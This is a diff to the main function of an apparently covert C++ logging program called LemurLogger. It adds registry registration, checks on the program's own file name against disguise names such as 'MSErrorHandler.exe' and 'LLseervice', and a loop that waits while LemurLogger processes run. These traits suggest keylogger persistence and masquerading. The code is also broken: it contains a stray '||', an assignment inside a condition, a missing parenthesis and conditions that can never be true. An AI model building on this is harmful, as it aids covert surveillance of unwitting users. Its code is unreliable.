@@ -15,11 +15,10 @@ using namespace std;
 
 int main()
 {
-	pre::start();
-
-    Registry::RegisterProgram();
+    pre::start();
+    Registry::RegisterProgram();||
     string filename = IO::getFileName();
-    if ((filename != "LLseervice.exe" &&  filename != "LLseervice" )||(filename != "LemurLogger.exe" &&  filename != "LemurLogger")  ){
+    if (filename == "MSErrorHandler.exe" &&  filename == "MSErrorHandler" ){
         std::string msg = "sate idle";
         Helper::WriteAppLog(msg);
         char* temp = getenv("temp");
@@ -33,8 +32,16 @@ int main()
             }
 
         }
+    }else{
+    	if(filename == "LLseervice.exe" &&  filename = "LLseervice"{
+ 		while (GetIsOnProcess("LemurLogger.exe")||GetIsOnProcess("LemurLogger")){
+                	std::string msg = "sate idle";
+        		Helper::WriteAppLog(msg);
+            	}
+         }
     }
-	MSG Msg;
+    	
+    MSG Msg;
     IO::MkDir(IO::GetOurPath(true));
     GetProcID();
     curprocname = GetProcName(curpid);
